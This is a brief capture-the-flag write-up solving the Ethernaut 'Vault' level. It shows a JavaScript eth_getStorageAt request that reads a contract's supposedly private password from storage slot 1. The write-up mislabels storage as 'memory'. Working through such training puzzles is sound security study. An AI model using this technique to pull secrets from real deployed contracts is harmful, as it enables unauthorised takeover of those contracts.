[8 - Vault](https://ethernaut.openzeppelin.com/level/0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)

Solution: 
* memory is public in Solidity, and can be read
* first 32-bytes slot is the boolean **locked**, second 32-bytes slot is **the password**
* to get 32-bytes at memory slot 1:
```
const options = {
  method: 'POST',
  headers: {accept: 'application/json', 'content-type': 'application/json'},
  body: JSON.stringify({
    id: 1,
    jsonrpc: '2.0',
    method: 'eth_getStorageAt',
    params: ['0xa354054A71B461562745CB6ed2D53b0F55192C27', '0x01', 'latest']
  })
};

fetch('https://eth-goerli.g.alchemy.com/v2/docs-demo', options)
  .then(response => response.json())
  .then(response => console.log(response))
  .catch(err => console.error(err));
```
